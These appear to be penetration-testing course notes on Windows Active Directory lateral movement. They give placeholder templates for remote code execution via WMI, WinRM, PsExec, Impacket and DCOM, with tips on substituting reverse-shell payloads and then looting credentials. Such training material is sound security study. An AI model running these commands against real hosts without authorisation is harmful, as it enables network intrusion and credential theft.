# AD Lateral Movement — WMI, WinRM, PsExec & DCOM

**When you have valid credentials and local-admin-equivalent access on another Windows host, use the native/remote-management surface that is reachable.** The goal is the same: execute a command on the target, obtain a shell, then enumerate and loot again.

```text
Valid plaintext credentials
        ↓
Is the user privileged on the target?
        ↓
├─ WMI / CIM       → RPC 135 + dynamic RPC ports
├─ WinRM / WinRS   → 5985 HTTP / 5986 HTTPS
├─ PsExec          → SMB 445 + ADMIN$ + service creation
└─ DCOM / MMC      → RPC 135 + local Administrator
```

> [!note]
> PEN-200's Chapter 23 prose appears to reverse the WinRM HTTP/HTTPS port labels. Operationally, remember **5985 = HTTP** and **5986 = HTTPS**.

---

## WMI — remote process creation

WMI can create processes through `Win32_Process.Create`. Remote WMI uses RPC endpoint mapping on TCP **135** and then high/dynamic RPC ports. The account must be a member of the target's local **Administrators** group (a domain user can satisfy this).

### Legacy `wmic`

```cmd
wmic /node:<TARGET_IP> /user:<DOMAIN>\<USER> /password:<PASSWORD> process call create "cmd.exe /c <COMMAND>"
```

`wmic` is deprecated, but it is still useful to recognize.

### PowerShell CIM over DCOM

```powershell
$username = '<DOMAIN>\<USER>'
$password = '<PASSWORD>'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username,$secureString

$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <TARGET_IP> -Credential $credential -SessionOption $options

$command = 'cmd.exe /c <COMMAND>'
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}
```

Successful WMI process creation returns `ReturnValue = 0`.

> [!important]
> WMI-created processes are spawned by the WMI Provider Host in **Session 0**. A GUI payload such as `calc.exe` may therefore be running without appearing on the interactive user's desktop. For an actual foothold, use a command/reverse-shell payload instead.

See [[Basics/Shell & upgrade/Reverse Shell One-Liners|Reverse Shell One-Liners]].

---

## WinRM / WinRS / PowerShell Remoting

WinRM implements WS-Management and provides remote command execution. PEN-200 demonstrates both `winrs` and PowerShell remoting.

### WinRS

The domain user must belong to **Administrators** or **Remote Management Users** on the target.

```cmd
winrs -r:<TARGET_HOST> -u:<DOMAIN>\<USER> -p:<PASSWORD> "cmd /c hostname & whoami"
```

Replace the test command with a PowerShell payload if you need a reverse shell.

### PowerShell remoting

```powershell
$username = '<DOMAIN>\<USER>'
$password = '<PASSWORD>'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username,$secureString

$session = New-PSSession -ComputerName <TARGET> -Credential $credential
Enter-PSSession $session
```

From Kali, if WinRM is reachable, your existing workflow still applies:

```bash
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>'
```

---

## PsExec — SMB + remote service

PsExec is useful when you have local Administrator access and SMB is available.

### Requirements

```text
Local Administrator on target
+ SMB / File and Printer Sharing reachable
+ ADMIN$ share available
```

### What PsExec does

```text
1. Copies psexesvc.exe to the remote host
2. Creates/starts a service on the target
3. Runs the requested command as a child of that service
```

Windows-to-Windows example:

```powershell
PsExec64.exe -i \\<TARGET_HOST> -u <DOMAIN>\<USER> -p '<PASSWORD>' cmd
```

From Kali, Impacket provides equivalent remote-service/WMI-style execution options:

```bash
impacket-psexec <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP>
impacket-wmiexec <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP>
```

> [!tip]
> Use a **hostname/FQDN** when you specifically need Kerberos. Using an IP can cause NTLM to be selected instead.

---

## DCOM — MMC20.Application remote execution

DCOM extends COM across the network. PEN-200 uses the MMC application object to call `ExecuteShellCommand` remotely. This technique uses RPC on TCP **135** and requires local Administrator access on the target.

From an elevated PowerShell session:

```powershell
$dcom = [System.Activator]::CreateInstance(
    [type]::GetTypeFromProgID('MMC20.Application.1','<TARGET_IP>')
)

$dcom.Document.ActiveView.ExecuteShellCommand(
    'cmd',
    $null,
    '/c <COMMAND>',
    '7'
)
```

For a foothold, replace `<COMMAND>` with an encoded PowerShell/reverse-shell launcher. Like WMI, the process may execute in **Session 0**, so verify with command output, a callback, or process listing rather than expecting a visible GUI.

---

## Quick choice

| Situation | Good first choice |
|---|---|
| WinRM open / user in Remote Management Users | `winrs`, `New-PSSession`, Evil-WinRM |
| SMB 445 + ADMIN$ + local admin | PsExec |
| RPC reachable + local admin | WMI/CIM or DCOM |
| You have an NTLM hash instead of plaintext | [[Lateral Movement — Pass-the-Hash]] / [[Overpass-the-Hash]] |
| You have a Kerberos ticket | [[pass-the-ticket]] |

After landing on the target, **repeat local enumeration → privilege check → credential/ticket looting → BloodHound/AD enumeration** rather than treating lateral movement as the end of the chain.
